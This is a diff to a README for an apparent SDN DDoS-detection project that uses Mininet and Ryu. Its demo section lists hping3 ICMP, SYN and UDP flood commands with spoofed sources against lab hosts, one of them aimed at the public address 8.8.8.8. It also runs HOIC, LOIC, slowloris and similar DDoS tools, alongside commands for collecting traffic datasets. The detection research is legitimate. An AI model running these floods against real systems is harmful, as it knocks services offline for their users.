@@ -89,30 +89,42 @@ http://192.168.0.100:8008/app/mininet-dashboard/html/index.html#charts
 ```
 
 # III. Demo
-	Start the web on any host, here I use host 1 as the web server
-		python -m SimpleHTTPServer 80
-	Test Web Server: using another host to request to host 1.
-		wget http://10.0.0.1
-	Icmp flood command: h6 hping3 -1 -V -d 120 -w 64 -p 80 --rand-source --flood h1
-	SYN flood command: 	h6 hping3 -S -V -d 120 -w 64 -p 80 --rand-source --flood h1
-	Udp flood command:  h6 hping3 -2 -V -d 120 -w 64 -p 80 --rand-source --flood h1
-	attack Controller:  h6 hping3 -1 -V -d 120 -w 64 -p 80 --rand-source --flood 10.0.0.104
-	attack Public	 :  h6 hping3 -1 -V -d 120 -w 64 -p 80 --rand-source --flood 8.8.8.8
-	other tool attack: I use some cehv11 ddos attack tools
-		cd project/tool-dos/tool-attack/
-		wine Hoic.exe
-		mono LOIC.exe
-		python pyloris.py
-		python3 slowloris.py 10.0.0.1 -p 80
-		python torhammer.py -t 10.0.0.1
-		python torhammer.py -t 10.0.0.1 -p 80
-		python3 saphyra http://10.0.0.1/ (full CPU)
-		python3 RDDoS_Tool.py => select 2 => IP - port
-
-In addition to using the CIC dataset, during the process of experimenting with detecting DDoS attacks, I collected and added to the dataset.
-	Normal Dataset:
-		Controller: ryu-manager collect_benign_trafic.py
-		Mininet: sudo python3 generate_benign_trafic.py 
-	DDoS Dataset:
-		Controller: ryu-manager collect_ddos_trafic.py
-		Mininet: sudo python3 generate_ddos_trafic.py
+Start the web on any host, here I use host 1 as the web server
+```sh
+python -m SimpleHTTPServer 80
+```
+Test Web Server: using another host to request to host 1.
+```sh
+wget http://10.0.0.1
+```
+Attack DDOS
+```sh
+Icmp flood command: h6 hping3 -1 -V -d 120 -w 64 -p 80 --rand-source --flood h1
+SYN flood command: 	h6 hping3 -S -V -d 120 -w 64 -p 80 --rand-source --flood h1
+Udp flood command:  h6 hping3 -2 -V -d 120 -w 64 -p 80 --rand-source --flood h1
+attack Controller:  h6 hping3 -1 -V -d 120 -w 64 -p 80 --rand-source --flood 10.0.0.104
+attack Public	 :  h6 hping3 -1 -V -d 120 -w 64 -p 80 --rand-source --flood 8.8.8.8
+```
+Other tool attack: I use some cehv11 ddos attack tools
+```sh
+cd project/tool-dos/tool-attack/
+wine Hoic.exe
+mono LOIC.exe
+python pyloris.py
+python3 slowloris.py 10.0.0.1 -p 80
+python torhammer.py -t 10.0.0.1
+python torhammer.py -t 10.0.0.1 -p 80
+python3 saphyra http://10.0.0.1/ (full CPU)
+python3 RDDoS_Tool.py => select 2 => IP - port
+```
+In addition to using the CIC dataset, during the process of experimenting with detecting DDoS attacks, I collected and added to the dataset.  
+Normal Dataset:
+```sh
+Controller: ryu-manager collect_benign_trafic.py
+Mininet: sudo python3 generate_benign_trafic.py
+```
+DDoS Dataset:
+```sh
+Controller: ryu-manager collect_ddos_trafic.py
+Mininet: sudo python3 generate_ddos_trafic.py
+```
